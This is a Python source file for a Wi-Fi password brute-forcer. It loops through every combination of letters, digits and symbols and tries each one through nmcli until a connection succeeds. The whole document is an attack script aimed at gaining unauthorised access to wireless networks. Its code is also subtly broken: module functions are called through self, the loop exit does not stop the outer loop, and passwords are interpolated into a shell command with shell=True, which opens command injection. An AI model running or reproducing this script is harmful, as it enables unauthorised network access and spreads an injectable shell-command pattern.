import time
import itertools

# All symbols used in passwords first alphabet then numbers then other symbols as an array
symbols = [
    "a",
    "b",
    "c",
    "d",
    "e",
    "f",
    "g",
    "h",
    "i",
    "j",
    "k",
    "l",
    "m",
    "n",
    "o",
    "p",
    "q",
    "r",
    "s",
    "t",
    "u",
    "v",
    "w",
    "x",
    "y",
    "z",
    "A",
    "B",
    "C",
    "D",
    "E",
    "F",
    "G",
    "H",
    "I",
    "J",
    "K",
    "L",
    "M",
    "N",
    "O",
    "P",
    "Q",
    "R",
    "S",
    "T",
    "U",
    "V",
    "W",
    "X",
    "Y",
    "Z",
    "0",
    "1",
    "2",
    "3",
    "4",
    "5",
    "6",
    "7",
    "8",
    "9",
    "!",
    "@",
    "#",
    "$",
    "%",
    "^",
    "&",
    "*",
    "(",
    ")",
    "-",
    "_",
    "=",
    "+",
    "[",
    "]",
    "{",
    "}",
    ";",
    ":",
    "'",
    '"',
    ",",
    ".",
    "<",
    ">",
    "/",
    "?",
    "\\",
    "|",
    "`",
    "~",
]


def connect_wifi(ssid, passkey):
    try:
        import subprocess

        output = subprocess.check_output(
            f"nmcli dev wifi connect {ssid} password {passkey}", shell=True
        )
        if "Device 'wlan0' successfully activated" in str(output):
            print(
                f"[+] WiFi '{ssid}' successfully connected with '{passkey}'\n", "green"
            )
            return True
        else:
            print("[-] Wrong password\n")
            time.sleep(7)
            return False
    except Exception:
        print("[!!] Connection Failed\n")


def brute_force_pass(self, ssid):
    max_length = input("Enter maximum password length to attempt: ")
    max_length = int(max_length)
    print("Starting brute force attempt...")
    start_time = time.time()
    for length in range(1, max_length + 1):
        for attempt in itertools.product(symbols, repeat=length):
            password = "".join(attempt)
            print(password)
            if self.connect_wifi(ssid, password):
                end_time = time.time()
                print(
                    f"Password dictionary of max length {max_length} finished in {end_time - start_time} seconds"
                )
                break
